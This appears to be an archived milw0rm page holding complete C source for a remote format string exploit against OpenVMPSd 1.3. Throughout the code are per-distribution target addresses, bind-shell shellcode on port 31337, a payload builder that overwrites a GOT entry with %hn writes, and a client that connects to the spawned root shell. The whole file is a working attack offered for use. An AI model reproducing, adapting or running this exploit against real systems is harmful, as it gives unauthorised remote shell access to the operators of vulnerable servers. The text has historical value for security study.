<html>
<head>
<title>OpenVMPSd <= 1.3 Remote Format String Exploit (Multiple Targets)</title>
<pre>
/*
 * gexp-openvmpsd.c
 *
 * OpenVMPSd v1.3 Remote Format String Exploit
 * Copyright (C) 2005 Gotfault Security
 *
 * Bug found and developed by: barros and xgc
 *
 * Original Reference:
 * http://gotfault.net/research/exploit/gexp-openvmpsd.c
 *
 */

#include &lt;getopt.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;netdb.h&gt;
#include &lt;errno.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;stdio.h&gt;

/*==[ Prototypes ]==*/
void Usage(char *);
void fatal(char *);
int  CreateEvilBuffer(int, int, int, int, char *);
void ExecuteShell(int);
void SendBuffer(int , char *, int);
int  CreateUdpSocket(void);
int  ConectToHost(char *, int);

/*==[ Defines ]==*/
#define	DEFAULT_PORT		1589	// Default server port
#define BIND_PORT		31337	// Default port to bind
#define NOPSIZE			50	// Do not change this value cause the shellcode space is &quot;limited&quot;
#define NOP			0x90	// Nop value
#define PAD			&quot;...&quot;	// Format string alignment
#define PORT_OFFSET		29	// Offset to fix the shellcode

/*==[ Targets ]==*/
struct
{
	char	*Name;
	int	Gotaddr;
	int	Retaddr;
	int	Pop;
}Targets[] =
	{
		&quot;OpenVMPSd v1.3 @ Slackware 10.0&quot;,
		0x0804e57c,
		0xbffff4f5,
		19,

		&quot;OpenVMPSd v1.3 @ Debian 3.0 Linux&quot;,
                0x0804d0f8,
		0xbffff7ac,
		29,

		&quot;OpenVMPSd v1.3 @ Fedora Core 2&quot;,
		0x0804d0f8,
		0xbffff7ac,
		19,

		// Finish
		0,
		0,
		0,
		0
	};

/*==[ Shellcode by Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt; ]==*/
char shellcode[] =
        &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80&quot;
        &quot;\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80&quot;
        &quot;\x89\xc7\x52\x66\x68&quot;
        &quot;BP&quot; // Port to bind
        &quot;\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80&quot;
        &quot;\xb0\x66\xb3\x04\xcd\x80&quot;
        &quot;\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80&quot;
        &quot;\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80&quot;
        &quot;\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;

/*==[ OpenVMPSd UDP packet header ]==*/
#define SIZE_OF_HEADER 14
char header[] = &quot;\x41\x01\x41\x01\x41\x41\x41\x41\x00\x00\x0c\x02&quot;;

int main(int argc, char **argv)
{
	extern  char		*optarg;
	extern  int		optind;
		char		opt;
		char		*Host = NULL;
		int		Port = DEFAULT_PORT;
		int		BindPort = BIND_PORT;
		int		TargetNumber = 0;
		int		Sock,i;
		char		*EvilBuffer;
		int		BufLen;

	fprintf(stdout,&quot;\n--=[ OpenVMPSd Remote Format String Exploit ]\n\n&quot;);
	
	// Process arguments
	while ( (opt = getopt(argc,argv,&quot;h:t:p:r:&quot;)) != EOF)
	{
		switch(opt)
		{
			case 'r':
				BindPort = atoi(optarg);
				if(!BindPort) Usage(argv[0]);
			break;
			case 'p':
				Port = atoi(optarg);
				if(!Port) Usage(argv[0]);
			break;
			case 't':
				TargetNumber = atoi(optarg);
			break;
			case 'h':
				Host = optarg;
			break;
			default: Usage(argv[0]);
			break;
		}
	}
	if(Host == NULL) Usage(argv[0]);

	// Verify target
	for(i=0;;i++)
		if(Targets[i].Name == 0) break;
	if(--i&lt;TargetNumber) Usage(argv[0]);

	fprintf(stdout,&quot;[*] Target plataform      : %s\n&quot;,Targets[TargetNumber].Name);
	fprintf(stdout,&quot;[*] Target host           : %s\n&quot;,Host);
	fprintf(stdout,&quot;[*] Target port           : %u\n&quot;,Port);
	fprintf(stdout,&quot;[*] Bind to port          : %u\n&quot;,BindPort);
	fprintf(stdout,&quot;[*] Target GOT            : %#010x\n&quot;,Targets[TargetNumber].Gotaddr);
	fprintf(stdout,&quot;[*] Target Retaddr        : %#010x\n&quot;,Targets[TargetNumber].Retaddr);	
	fprintf(stdout,&quot;[*] Target POP            : %d\n\n&quot;,Targets[TargetNumber].Pop);

	fprintf(stdout,&quot;[*] Connecting\t\t  : &quot;);
	fflush(stdout);
	Sock = ConectToHost(Host,Port);
	if(Sock == -1) fatal(&quot;Could not connect&quot;);
	else fprintf(stdout,&quot;done\n&quot;);

	fprintf(stdout,&quot;[*] Creating EvilBuffer\t  : &quot;);
	fflush(stdout);
	EvilBuffer = (char *)malloc(strlen(shellcode)+NOPSIZE+strlen(PAD)+515);
	if(!EvilBuffer) fatal(&quot;Out of memory&quot;);
	BufLen = CreateEvilBuffer(Targets[TargetNumber].Gotaddr,Targets[TargetNumber].Retaddr,Targets[TargetNumber].Pop,BindPort,EvilBuffer);
	fprintf(stdout,&quot;done\n&quot;);
	
	fprintf(stdout,&quot;[*] Attacking\t\t  : &quot;);
	fflush(stdout);
	SendBuffer(Sock,EvilBuffer,BufLen);
	fprintf(stdout,&quot;done\n&quot;);

	close(Sock);

	sleep(1);

        Sock = ConectToShell(Host,BindPort);

        if(Sock == -1) {
		fprintf(stdout,&quot;[*] Exploit Failed.\n\n&quot;);
		exit(0);
	}
        else {
		fprintf(stdout,&quot;[*] Spawning Shell...\n\n&quot;);
		ExecuteShell(Sock);
	        close(Sock);
	}
}

void SendBuffer(int Sock, char *Buffer, int size)
{
	if(send(Sock,Buffer,size,0) == -1)
		fatal(&quot;SEND&quot;);
}

int ConectToHost(char *Host,int Port)
{
	struct 		sockaddr_in server;
	struct 		hostent *hp;
	int 		s;

	server.sin_family = AF_INET;
	hp = gethostbyname(Host);
	if(!hp) return(-1);

	memcpy(&amp;server.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
	server.sin_port = htons(Port);

	s = socket(PF_INET,SOCK_DGRAM,0);
	if(connect(s,(struct sockaddr *)&amp;server, sizeof(server)) &lt; 0)
		return(-1);

	return(s);
}

int ConectToShell(char *Host,int Port)
{
        struct          sockaddr_in server;
        struct          hostent *hp;
        int             s;

        server.sin_family = AF_INET;
        hp = gethostbyname(Host);
        if(!hp) return(-1);

        memcpy(&amp;server.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
        server.sin_port = htons(Port);

        s = socket(PF_INET,SOCK_STREAM,0);
        if(connect(s,(struct sockaddr *)&amp;server, sizeof(server)) &lt; 0)
                return(-1);

        return(s);
}

int CreateEvilBuffer(int GOT, int RETADDR, int POP, int BINDTOPORT, char *buffer)
{
	char		*nops = malloc(NOPSIZE+1);
	char		*ptr;
	unsigned short	*len;
	unsigned short	*portPtr = (unsigned short *)(shellcode+PORT_OFFSET);

	// Fix shellcode
	*portPtr = htons(BINDTOPORT);

	// Header
	ptr = buffer;
	memcpy(ptr,header,12);
	ptr += SIZE_OF_HEADER;
	len = (unsigned short *)(buffer + SIZE_OF_HEADER - 2);

	// Create Nops
	bzero(nops,NOPSIZE+1);
	memset(nops,NOP,NOPSIZE);
	
	// Create format string attack
	sprintf(ptr,
		PAD
		&quot;%c%c%c%c&quot;
                &quot;%c%c%c%c&quot;
                &quot;%%.%dd&quot;
                &quot;%%%d$hn&quot;
                &quot;%%.%dd&quot;
                &quot;%%%d$hn&quot;
                &quot;%s%s&quot;,
                ((u_long)GOT),
                ((u_long)GOT &gt;&gt; 8),
                ((u_long)GOT &gt;&gt; 16),
                ((u_long)GOT &gt;&gt; 24),
                ((u_long)GOT+2),
                (((u_long)GOT+2) &gt;&gt; 8),
                (((u_long)GOT+2) &gt;&gt; 16),
                (((u_long)GOT+2) &gt;&gt; 24),
                ((RETADDR &amp; 0x0000FFFF) - 9 - 63),
                POP,
                (((RETADDR &amp; 0xFFFF0000)&gt;&gt;16) + 0x10000 - (RETADDR &amp; 0x0000FFFF)) - 1,
                POP+1,nops,shellcode); 

	*len = htons(strlen(ptr));

	return (strlen(ptr)+14);
}

#define	STDIN			0
#define STDOUT			1
void ExecuteShell(int Sock)
{
	char 		buffer[1024 * 10];
	int 		count;
	fd_set 		readfs;

	write(Sock,&quot;uname -a;id\n&quot;,12);
	while(1)
	{
		FD_ZERO(&amp;readfs);
		FD_SET(STDIN, &amp;readfs);
		FD_SET(Sock, &amp;readfs);
		if(select(Sock + 1, &amp;readfs, NULL, NULL, NULL) &gt; 0)
		{
			if(FD_ISSET(STDIN, &amp;readfs))
			{
				if((count = read(STDIN, buffer, 1024)) &lt;= 0)
				{
					if(errno == EWOULDBLOCK || errno == EAGAIN)
						continue;
					else
					{
						close(Sock);
						exit(-1);
					}
				}
				write(Sock, buffer, count);
			}
			if(FD_ISSET(Sock, &amp;readfs))
			{
				if((count = read(Sock, buffer, 1024)) &lt;= 0)
				{
					if(errno == EWOULDBLOCK || errno == EAGAIN)
						continue;
					else
					{
						close(Sock);
						exit(-1);
					}
				}
				write(STDOUT, buffer, count);
			}
		}
	}
}

void fatal(char *ErrorMsg)
{
	fprintf(stderr,&quot;ERROR - %s\n\n&quot;,ErrorMsg);
	exit(1);
}

void Usage(char *Prog)
{
	int i;
	fprintf(stderr,	&quot;Usage: %s -h hostname &lt;options&gt;\n\n&quot;
			&quot;Options:\n\n&quot;
			&quot; -t target     : Select the target\n&quot;
			&quot; -p portnumber : Sets a new port number &lt;default: %d&gt;\n&quot;
			&quot; -r bindport   : Sets the port to bind a shell &lt;default: %d&gt;\n\n&quot;
			&quot;Targets:\n\n&quot;,Prog,DEFAULT_PORT,BIND_PORT);

	for(i=0;;i++)
	{
		if(Targets[i].Name != 0)
			fprintf(stderr,&quot; [%u] %s\n&quot;,i,Targets[i].Name);
		else
			break;
	}
	fprintf(stderr,&quot;\n&quot;);
	exit(1);
}

// milw0rm.com [2006-02-10]
</pre>
</html>

